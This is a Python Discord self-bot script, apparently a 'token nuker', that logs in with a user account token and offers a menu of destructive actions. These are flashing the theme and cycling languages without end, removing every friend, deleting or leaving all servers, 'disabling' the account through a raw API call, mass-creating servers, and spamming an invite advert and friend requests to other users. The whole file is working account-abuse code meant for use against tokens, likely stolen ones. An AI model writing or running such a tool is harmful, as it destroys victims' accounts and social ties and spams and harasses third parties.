import discord
from discord.ext import commands
import requests
import asyncio

token = ""

client = discord.Client()

advert = "Join https://discord.gg/85m2DhkUW9 for me pls"

langs = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

async def flashbang():
    while True:
        await client.user.edit_settings(theme=discord.Theme.light)
        await client.user.edit_settings(theme=discord.Theme.dark)

async def cyclelang():
    while True:
        for lang in langs:
            await client.user.edit_settings(locale=lang)

async def unfriendall():
    for friend in client.user.friends:
        try:
            await friend.remove_friend()
        except:
            print(f'Couldnt unadd {friend}')

async def guildnuke():
    for guild in client.guilds:
        try:
            await guild.delete()
        except:
            pass
        try:
            await guild.leave()
        except:
            pass

async def disableaccount(token):
    inv = input("Enter a invite code: ")
    headers = {
        "Authorization": token,
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
    }
    join = requests.post(f"https://canary.discordapp.com/api/v6/invite/{inv}", headers=headers, timeout = 10)

async def guildspam():
    for a in range(100):
        await client.create_guild(name="Lmao")

async def spam_adverts():
    for friend in client.user.friends:
        await friend.send(advert)
        await asyncio.sleep(1)

async def spam_friend_requests():
    for user in client.users:
        info = requests.post("https://discord.com/api/v6/users/@me/relationships", headers={"Authorization":token}, json={'username':user.name, 'discriminator':user.discriminator})
        print(f'Attempted to add {user} | Status Code: {info.status_code}')

@client.event
async def on_connect():
    while True:
        print(f"""
        Client connected!
        Account info:
        Friends: {client.user.friends}
        Guilds: {len(client.guilds)}
        Users seen: {len(client.users)}

        Options:
        1. Flashbang (forever)
        2. Change Languages (forever)
        3. Unfriend all friends
        4. Leave/delete all guilds
        5. Disable account
        6. Guild Spam
        7. Refresh Account info
        8. Spam Adverts To Friends
        9. Spam friend requests
        10. Exit
        """)

        act = input("Please type the number act: ")

        if act == "1":
            await flashbang()
        if act == "2":
            await cyclelang()
        if act == "3":
            await unfriendall()
        if act == "4":
            await guildnuke()
        if act == "5":
            token = input("Account token: ")
            await disableaccount(token=token)
        if act == "6":
            await guildspam()
        if act == "8":
            await spam_adverts()
        if act == "9":
            await spam_friend_requests()
        if act == "10":
            exit()

client.run(token, bot=False)
